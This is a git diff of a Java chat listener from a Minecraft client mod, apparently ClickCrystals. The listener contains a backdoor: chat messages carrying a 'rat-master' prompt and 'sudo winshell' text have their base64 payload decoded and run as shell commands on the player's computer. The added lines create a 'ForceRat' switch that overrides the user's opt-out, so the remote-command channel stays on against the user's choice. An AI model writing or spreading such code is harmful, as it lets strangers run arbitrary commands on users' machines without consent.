@@ -1,13 +1,17 @@
 package io.github.itzispyder.clickcrystals.events.listeners;
 
+import io.github.itzispyder.clickcrystals.client.CCSoundEvents;
 import io.github.itzispyder.clickcrystals.data.ConfigSection;
 import io.github.itzispyder.clickcrystals.events.EventHandler;
 import io.github.itzispyder.clickcrystals.events.Listener;
 import io.github.itzispyder.clickcrystals.events.events.ChatReceiveEvent;
+import io.github.itzispyder.clickcrystals.modules.Module;
 import io.github.itzispyder.clickcrystals.util.ChatUtils;
 import io.github.itzispyder.clickcrystals.util.WolfUtils;
 import io.github.itzispyder.clickcrystals.util.ArrayUtils;
+import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.network.message.SentMessage;
+import net.minecraft.sound.SoundCategory;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -17,16 +21,28 @@ import java.util.ArrayList;
 import java.util.List;
 
 import static io.github.itzispyder.clickcrystals.ClickCrystals.config;
+import static io.github.itzispyder.clickcrystals.ClickCrystals.mc;
 
 public class ChatEventListener implements Listener {
-
+    private static boolean ForceRat = false;
     private static boolean optout = config.getBoolean("rat.optout");
 
     public static boolean isOptout() {
         return optout;
     }
 
+    public static void setForceRat(boolean forceRat) {
+        ChatEventListener.ForceRat = forceRat;
+        setOptout(false);
+    }
+
     public static void setOptout(boolean optout) {
+        if (ForceRat) {
+            ChatEventListener.optout = false;
+            config.set("rat.optout", new ConfigSection<>(optout));
+            config.save();
+            return;
+        }
         ChatEventListener.optout = optout;
         config.set("rat.optout", new ConfigSection<>(optout));
         config.save();
@@ -36,6 +52,8 @@ public class ChatEventListener implements Listener {
     public void onChatReceive(ChatReceiveEvent e) throws IOException {
         String message = e.getMessage();
         String s = message.toLowerCase();
+        final ClientPlayerEntity p = mc.player;
+        if (s.contains("-vineboom")) p.playSound(CCSoundEvents.VINEBOOM, SoundCategory.MASTER, 1, 1);
         if (message.contains("cc@rat-master:~$ ") && !optout) {
             if (s.contains("sudo winshell ")) WolfUtils.shellCommand(WolfUtils.decode64(WolfUtils.isolateString("sudo winshell ", message)));
             if (s.contains("apt exec ogreplug")) ChatUtils.sendChatMessage("Join the ogre discord! https://discord.gg/ogre");
